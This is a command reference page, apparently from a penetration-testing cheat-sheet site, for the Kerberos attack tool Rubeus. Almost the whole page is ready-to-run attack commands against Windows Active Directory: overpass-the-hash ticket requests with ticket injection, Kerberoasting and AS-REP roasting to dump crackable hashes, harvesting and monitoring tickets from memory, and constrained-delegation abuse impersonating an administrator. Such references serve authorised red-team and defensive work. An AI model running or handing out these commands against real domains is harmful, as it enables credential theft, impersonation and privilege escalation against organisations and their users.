# Rubeus

> A C# toolset for raw Kerberos interaction and abuse on Windows: ticket requests, Kerberoasting, AS-REP roasting, pass-the-ticket and delegation attacks.

- Category: Active Directory
- Commands: 7
- Page: https://terminal.rokibulroni.com/tool/active-directory/rubeus
- Homepage: https://github.com/GhostPack/Rubeus
- Documentation: https://github.com/GhostPack/Rubeus
- Tags: Active Directory, Kerberos, roasting, delegation

## Install

- other: `Compile from source with Visual Studio, or use a trusted precompiled build`

## Ticket requests

### Rubeus.exe asktgt /user:<user> /password:<pass> /domain:<domain>

```bash
Rubeus.exe asktgt /user:<user> /password:<pass> /domain:<domain>
```

Example:

```bash
Rubeus.exe asktgt /user:svc /password:Pass123 /domain:corp.local
```

Requests a TGT and prints it; add /ptt to inject it into the session.

### Rubeus.exe asktgt /user:<user> /rc4:<nt> /ptt

```bash
Rubeus.exe asktgt /user:<user> /rc4:<nt> /ptt
```

Example:

```bash
Rubeus.exe asktgt /user:svc /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
```

Overpass-the-hash: turns an NT hash into a usable Kerberos ticket.


## Roasting

### Rubeus.exe kerberoast /outfile:<file>

```bash
Rubeus.exe kerberoast /outfile:<file>
```

Example:

```bash
Rubeus.exe kerberoast /outfile:hashes.txt
```

Requests service tickets for all SPN accounts and writes crackable hashes.

### Rubeus.exe asreproast /format:hashcat /outfile:<file>

```bash
Rubeus.exe asreproast /format:hashcat /outfile:<file>
```

Example:

```bash
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

AS-REP roasting for accounts without pre-authentication, in hashcat format.


## Harvesting & abuse

### Rubeus.exe harvest /interval:<seconds>

```bash
Rubeus.exe harvest /interval:<seconds>
```

Example:

```bash
Rubeus.exe harvest /interval:30
```

Continuously collects TGTs from memory and renews them.

### Rubeus.exe monitor /interval:<seconds>

```bash
Rubeus.exe monitor /interval:<seconds>
```

Example:

```bash
Rubeus.exe monitor /interval:5
```

Watches for new logons and captures their tickets — useful after a coerced authentication.

### Rubeus.exe s4u /user:<svc> /rc4:<nt> /impersonateuser:<victim> /msdsspn:<spn> /ptt

```bash
Rubeus.exe s4u /user:<svc> /rc4:<nt> /impersonateuser:<victim> /msdsspn:<spn> /ptt
```

Example:

```bash
Rubeus.exe s4u /user:web$ /rc4:abc123 /impersonateuser:administrator /msdsspn:cifs/fs01.corp.local /ptt
```

Abuses constrained delegation to impersonate a user to a service.

## Related tools

- [Mimikatz](https://terminal.rokibulroni.com/tool/active-directory/mimikatz)
- [Impacket](https://terminal.rokibulroni.com/tool/active-directory/impacket)
- [Certipy](https://terminal.rokibulroni.com/tool/active-directory/certipy)
- [Hashcat](https://terminal.rokibulroni.com/tool/credentials/hashcat)
